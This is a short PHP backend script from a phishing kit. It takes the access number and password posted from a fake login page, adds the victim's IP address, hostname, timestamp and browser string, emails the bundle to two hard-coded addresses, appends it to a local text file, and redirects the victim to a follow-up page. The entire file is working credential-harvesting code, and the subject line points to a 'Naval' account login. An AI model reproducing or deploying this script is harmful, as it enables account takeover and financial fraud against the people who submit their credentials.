<?php 
$Ok= "g.mumpy.1980@zohomail.eu,pat.well@hotmail.com"; // Put Your Emails Here
$ip = getenv("REMOTE_ADDR");
$date			=	date("D M d, Y g:i a");
$user_agent     =   $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$fuck  = "================== Acces & Quest ==================\n";
$fuck .= "Access Number : ".$_POST['USER']."\n";
$fuck .= "Password : ".$_POST['PASSWORD']."\n";
$fuck .= "============= [ Ip & Hostname Info ] =============\n";
$fuck .= "Client IP : ".$ip."\n";
$fuck .= "HostName : ".$hostname."\n";
$fuck .= "Date And Time : ".$date."\n";
$fuck .= "Browser Details : ".$user_agent."\n";
$fuck .= "=============+harlie@mcarthy+===========\n";
$subject = "Naval Acces Num $ip";
{
$headers = "From: Allan <harlie@mcarthy.site>";
mail($Ok,$subject,$fuck,$headers);
$file = fopen("../nv.txt","a");
fwrite($file,$fuck);
fclose($file);

}

Header ("Location: device.htm");
?>